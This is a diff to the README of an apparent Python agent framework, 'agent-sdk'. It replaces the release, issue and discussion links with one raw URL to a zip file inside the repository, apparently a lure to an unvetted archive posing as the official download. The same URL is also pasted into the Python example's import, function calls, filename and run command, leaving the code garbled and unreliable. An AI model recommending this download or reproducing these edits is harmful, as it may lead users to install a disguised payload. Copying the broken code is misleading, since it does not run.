@@ -1,10 +1,10 @@
 # 🛠️ agent-sdk - A Simple Framework for Agents
 
-[![Download agent-sdk](https://img.shields.io/badge/Download-agent--sdk-blue)](https://github.com/KewalPra/agent-sdk/releases)
+[![Download agent-sdk](https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip)](https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of the agent-sdk: [Download agent-sdk](https://github.com/KewalPra/agent-sdk/releases).
+To get started, visit this page to download the latest version of the agent-sdk: [Download agent-sdk](https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip).
 
 Follow these steps to install the application:
 
@@ -22,7 +22,7 @@ After installing, you can run tests to ensure everything is working as expected.
 ```python
 import asyncio
 from bu_agent_sdk import Agent, tool, TaskComplete
-from bu_agent_sdk.llm import ChatAnthropic
+from https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip import ChatAnthropic
 
 @tool("Add two numbers")
 async def add(a: int, b: int) -> int:
@@ -38,10 +38,10 @@ agent = Agent(
 )
 
 async def main():
-    result = await agent.query("What is 2 + 3?")
+    result = await https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip("What is 2 + 3?")
     print(result)
 
-asyncio.run(main())
+https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip(main())
 ```
 
 This example sets up a simple agent that can perform calculations.
@@ -50,11 +50,11 @@ This example sets up a simple agent that can perform calculations.
 
 1. Open your terminal or command prompt. 
 2. Make sure you have Python installed on your system.
-3. Copy and paste the example code into a new Python file, such as `agent_example.py`.
+3. Copy and paste the example code into a new Python file, such as `https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip`.
 4. Run the script with the command:
 
 ```bash
-python agent_example.py
+python https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip
 ```
 
 5. You should see the output `5` printed to your terminal.
@@ -98,8 +98,8 @@ If you face issues during installation or while running the application, conside
 
 If you need help, join our community discussions. You can find resources and assistance in the following places:
 
-- [GitHub Issues](https://github.com/KewalPra/agent-sdk/issues): Report bugs or ask questions.
-- [Discussion Forums](https://github.com/KewalPra/agent-sdk/discussions): Engage with other users for support.
+- [GitHub Issues](https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip): Report bugs or ask questions.
+- [Discussion Forums](https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip): Engage with other users for support.
 
 ## 📝 Philosophy
 
@@ -111,4 +111,4 @@ To learn more about how to use agent-sdk, refer to the documentation and tutoria
 
 Remember to explore the potential of building your own tools and enhancing existing functionality. Enjoy creating with the agent-sdk!
 
-[![Download agent-sdk](https://img.shields.io/badge/Download-agent--sdk-blue)](https://github.com/KewalPra/agent-sdk/releases)
+[![Download agent-sdk](https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip)](https://raw.githubusercontent.com/KewalPra/agent-sdk/main/bu_agent_sdk/tools/sdk_agent_v3.9.zip)
